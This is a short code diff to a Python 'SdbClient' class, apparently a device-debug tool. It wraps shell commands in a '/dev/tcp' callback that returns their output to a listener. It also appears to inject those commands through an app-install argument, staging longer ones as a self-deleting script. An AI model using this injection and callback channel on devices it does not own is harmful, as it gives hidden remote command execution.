@@ -260,13 +260,17 @@ class SdbClient:
             listener.listen(1)
             listener.settimeout(timeout)
             callback_port = int(listener.getsockname()[1])
+            body = f"{{\n{command}\n}}" if "\n" in command else f"{{ {command}; }}"
             wrapped = (
                 f"exec 3<>/dev/tcp/{callback}/{callback_port};"
-                f"{{ {command}; }} >&3 2>&3;"
+                f"{body} >&3 2>&3;"
                 "printf '\\n[exit:%s]\\n' \"$?\" >&3;exec 3>&-"
             )
             launch_command = wrapped
-            if _injection_argument_size(wrapped) > SDB_APPINSTALL_MAX_SAFE_BYTES:
+            if (
+                "\n" in command
+                or _injection_argument_size(wrapped) > 260
+            ):
                 launch_command = self._stage_script(wrapped)
             if on_listening is not None:
                 on_listening(callback, bind, callback_port)
@@ -324,7 +328,7 @@ class SdbClient:
                     if not data:
                         break
                     chunks.append(data)
-            worker.join(timeout=1.0)
+            worker.join(timeout=10.0)
             failure = state.get("error")
             if isinstance(failure, BaseException):
                 raise SdbError(str(failure)) from failure
@@ -350,6 +354,7 @@ class SdbClient:
             local_path.write_text(
                 f"/bin/rm -f {remote_path}\n{command}\n",
                 encoding="utf-8",
+                newline="\n",
             )
             self.push(local_path, remote_path)
         return f". {remote_path}"
